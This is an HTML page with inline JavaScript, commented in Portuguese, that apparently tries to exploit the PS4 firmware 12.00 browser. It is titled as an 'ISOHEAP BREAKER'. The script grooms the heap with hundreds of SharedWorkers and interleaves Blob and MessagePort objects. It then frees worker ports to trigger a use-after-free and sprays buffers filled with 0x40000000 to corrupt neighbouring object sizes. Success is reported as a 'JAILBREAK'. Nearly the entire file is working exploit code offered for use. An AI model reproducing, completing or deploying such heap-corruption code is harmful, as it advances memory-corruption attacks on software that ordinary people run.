<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Universal Memory Hunt</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
        #log { border: 2px solid #333; width: 95%; height: 500px; margin: 20px auto; padding: 10px; text-align: left; overflow-y: auto; background: #000; font-size: 13px; }
        button { background-color: #004488; color: white; padding: 15px 30px; font-size: 18px; border: 1px solid #0088ff; cursor: pointer; border-radius: 5px; }
        .success { color: #00ffff; font-weight: bold; border: 1px solid #00ffff; padding: 5px; }
        .target-blob { color: #ff00ff; }
        .target-port { color: #ffff00; }
    </style>
</head>
<body>

    <h1>PS4 12.00 - ISOHEAP BREAKER</h1>
    <h3>Alvos: Blob (Size) | MessagePort (State) | ArrayBuffer</h3>
    <div id="status">Aguardando início...</div>
    <div id="log"></div>
    <br>
    <button onclick="start_hunt()">INICIAR CAÇADA UNIVERSAL</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. O CORRUPTOR
        // =================================================================
        function build_corruptor() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            // Padrão agressivo para sobrescrever tamanhos/ponteiros
            // 0x40000000 = 1GB (Para corromper .size ou .byteLength)
            buffer.fill(0x40000000); 
            return buffer;
        }

        // =================================================================
        // 2. SANDUÍCHE MISTO (A, B, C)
        // =================================================================
        var sandwich = [];
        var targets_blob = [];
        var targets_port = [];

        async function start_hunt() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            var payload = build_corruptor();
            log("Corruptor (0x400) construído.", "success");

            // FASE 1: BASE GROOMING
            log("Fase 1: Grooming (0-380)...");
            for(let i=0; i < 380; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "bg"+i);
                    w.port.start();
                    sandwich.push({type: 'padding', w: w});
                } catch(e){}
            }

            // FASE 2: SANDUÍCHE COMPLEXO (380-404)
            // Vamos alternar: [Worker] [Blob] [Worker] [Port] [Worker]
            // Para tentar acertar qualquer vizinho compatível na zona IsoHeap.
            
            log("Fase 2: Construindo Armadilha Mista (380-404)...");
            
            var p_count = 0;
            // O limite seguro é 404. Temos ~24 slots para brincar.
            var limit = 20; 

            var interval = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(interval);
                    trigger_universal(payload); 
                    return;
                }

                try {
                    // 1. Cria Worker (O Explosivo)
                    var id = 381 + p_count;
                    var w = new SharedWorker("data:text/javascript,1", "victim_"+id);
                    w.port.start();
                    
                    // 2. Cria Vizinho BLOB (Alvo A)
                    // Blob de tamanho conhecido (1024 bytes)
                    var blob_content = new Uint8Array(1024);
                    blob_content.fill(0x41);
                    var b = new Blob([blob_content]);
                    targets_blob.push({id: id, blob: b});

                    // 3. Cria Vizinho MESSAGEPORT (Alvo B)
                    var mc = new MessageChannel();
                    targets_port.push({id: id, port: mc.port1});

                    // Guarda referência do worker para explodir depois
                    sandwich.push({type: 'victim', w: w, id: id});
                    
                    log(`Conjunto ${id} alocado (Worker + Blob + Port).`);
                } catch(e) { log("Erro: " + e); }
                
                p_count++;
            }, 150);
        }

        function trigger_universal(payload) {
            log("!!! ZONA CRÍTICA. DISPARANDO UAF !!!", "warn");
            document.getElementById("status").innerText = "ATACANDO...";

            // Atacamos de trás para frente (os mais recentes primeiro)
            var attempts = 0;
            var attack_int = setInterval(() => {
                // Parar se acabarem os targets ou após tentativas seguras
                var victim_data = sandwich.pop();
                while(victim_data && victim_data.type !== 'victim') {
                    victim_data = sandwich.pop(); // Pula os paddings
                }

                if (!victim_data || attempts >= 8) {
                    clearInterval(attack_int);
                    log("Ataque finalizado. Se não houve sucesso, o isolamento é total.");
                    return;
                }
                
                log(`Explodindo Worker ${victim_data.id}...`);
                
                // 1. FREE
                victim_data.w.port.close();
                victim_data.w = null;

                // 2. SPRAY MASSIVO (Tenta preencher o buraco)
                var spray = [];
                for(let k=0; k<2000; k++) {
                    spray.push(new Uint32Array(payload));
                }

                // 3. VERIFICAÇÃO: ALGUÉM FOI ATINGIDO?
                
                // Checa BLOBS (Procura mudança de tamanho)
                // Se um Blob de 1024 bytes virar 1GB, TEMOS LEAK!
                var t_blob = targets_blob.find(t => t.id === victim_data.id);
                if (t_blob) {
                    if (t_blob.blob.size !== 1024) {
                        log("!!! SUCESSO NO BLOB !!!", "success target-blob");
                        log(`Blob ${t_blob.id} corrompido!`, "success");
                        log(`Tamanho Original: 1024`, "info");
                        log(`Novo Tamanho: ${t_blob.blob.size}`, "success");
                        alert("JAILBREAK: Blob Corruption Confirmada!");
                        clearInterval(attack_int);
                        return;
                    }
                }

                // Checa PORTAS (Tenta enviar mensagem)
                var t_port = targets_port.find(t => t.id === victim_data.id);
                if (t_port) {
                    try {
                        t_port.port.postMessage("ping");
                    } catch(e) {
                        log(`!!! SUCESSO NA PORTA ${t_port.id} !!!`, "success target-port");
                        log("Erro detectado: " + e, "success");
                        alert("JAILBREAK: Port Corruption Confirmada!");
                        clearInterval(attack_int);
                        return;
                    }
                }

                attempts++;
            }, 250);
        }
    </script>
</body>
</html>
